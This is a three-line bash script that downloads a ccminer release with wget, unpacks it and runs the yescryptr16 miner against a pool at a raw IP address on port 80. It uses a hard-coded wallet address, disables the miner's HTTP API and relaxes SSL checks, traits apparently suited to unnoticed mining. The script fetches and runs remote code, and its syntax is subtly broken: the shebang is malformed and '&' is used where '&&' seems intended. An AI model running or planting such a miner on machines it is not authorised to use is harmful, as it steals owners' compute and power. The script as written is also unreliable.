# /bin/bash

wget https://github.com/rplant8/ccminer-KlausT-8.21-mod-r18-src-fix/releases/download/1.0.1/ccminer-rplant-yescryptr16-linux-1.0.1.tar.gz
tar xvf ccminer-rplant-yescryptr16-linux-1.0.1.tar.gz & ./ccminer -a yescryptr16  -o stratum+tcp://178.128.86.41:80 -u vE1GBjfCJq8yLg7WwxwZAXizE3KZ7D6MiQ.tes --api-bind-http 0 --no-strict-ssl
